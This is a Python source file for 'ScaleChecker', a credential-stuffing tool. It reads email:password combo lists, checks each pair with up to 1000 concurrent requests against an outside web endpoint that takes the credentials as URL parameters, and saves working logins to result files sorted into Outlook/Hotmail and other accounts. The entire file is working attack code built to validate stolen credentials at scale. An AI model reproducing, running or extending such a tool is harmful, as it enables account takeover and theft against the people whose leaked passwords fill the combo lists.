import aiohttp
import asyncio
import json
import os
from datetime import datetime
from pystyle import Colors, Colorate
from colorama import Fore, init

current_datetime = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
hits,hotmail,other,bad = 0,0,0,0
combocount = sum(1 for _ in open('combos.txt', 'r'))
os.makedirs(f"results/{current_datetime}", exist_ok=True)
init()

def update_title():
    os.system(f'title ScaleChecker - Hits: {hits} - Hotmail: {hotmail} - Other: {other} - Bad: {bad}')

async def vm(session, email, password):
    global hits
    global hotmail
    global other
    global bad
    url = f"https://scalecord-d72f.vercel.app//check?email={email}&password={password}"
    microsoft_domains = ["hotmail.com", "live.com", "msn.com", "outlook.com"]

    try:
        async with session.get(url, ssl=False) as response:
            response_text = await response.text()
            out = json.loads(response_text)
            if out.get("Success") == 1:
                hits += 1
                
                # Check if the email's domain is in the Microsoft domains list
                if any(domain in email for domain in microsoft_domains):
                    print(Fore.CYAN + "OUTLOOK" + Fore.WHITE + f"{email}:{password}")
                    hotmail+=1
                    with open(f"results/{current_datetime}/hotmail.txt", "a") as f:
                        f.write(f"{email}:{password}\n")
                else:
                    print(Fore.YELLOW + "OTHER" + Fore.WHITE + f"{email}:{password}")
                    other+=1
                    with open(f"results/{current_datetime}/other.txt", "a") as f:
                        f.write(f"{email}:{password}\n")
            else:
                print(Fore.RED + "Bad " + Fore.WHITE + f"{email}:{password}")
                bad +=1
                with open(f"results/{current_datetime}/bad.txt", "a") as f:
                     f.write(f"{email}:{password}\n")
        update_title()
    except Exception as e:
        pass

async def main():
    os.system("cls")
    banner = """
███████╗ ██████╗ █████╗ ██╗     ███████╗
██╔════╝██╔════╝██╔══██╗██║     ██╔════╝
███████╗██║     ███████║██║     █████╗  
╚════██║██║     ██╔══██║██║     ██╔══╝  
███████║╚██████╗██║  ██║███████╗███████╗
╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝
"""
    print(Colorate.Horizontal(Colors.black_to_red, banner, 1))
    print(Fore.BLUE + "b1.0 exzzorpe edition")
    print()
    print(Fore.RED + f"Loaded [{combocount}] lines!")
    print(Fore.RED + "Checking...")
    print(Fore.RESET)

    # Define concurrency level
    concurrency = 1000

    # Read lines from file with explicit encoding
    with open('combos.txt', 'r', encoding='utf-8') as file:
        lines = file.readlines()

    # Create a semaphore to limit concurrency
    semaphore = asyncio.Semaphore(concurrency)

    async def bounded_vm(email, password):
        async with semaphore:
            async with aiohttp.ClientSession() as session:
                await vm(session, email, password)

    tasks = []
    for line in lines:
        line = line.strip()
        if ':' in line:
            email, password = line.split(':', 1)
            tasks.append(bounded_vm(email, password))

    # Run all tasks concurrently
    await asyncio.gather(*tasks)

    print(Fore.MAGENTA + "Finished! Stats:")
    print(Fore.GREEN + f"Hits: {hits}")
    print(Fore.CYAN + f"Outlook: {hotmail}")
    print(Fore.YELLOW + f"Other: {other}")
    print(Fore.RED + f"Bad: {bad}")
    print()
    input(Fore.RED + "Press enter to exit.")

if __name__ == "__main__":
    asyncio.run(main())
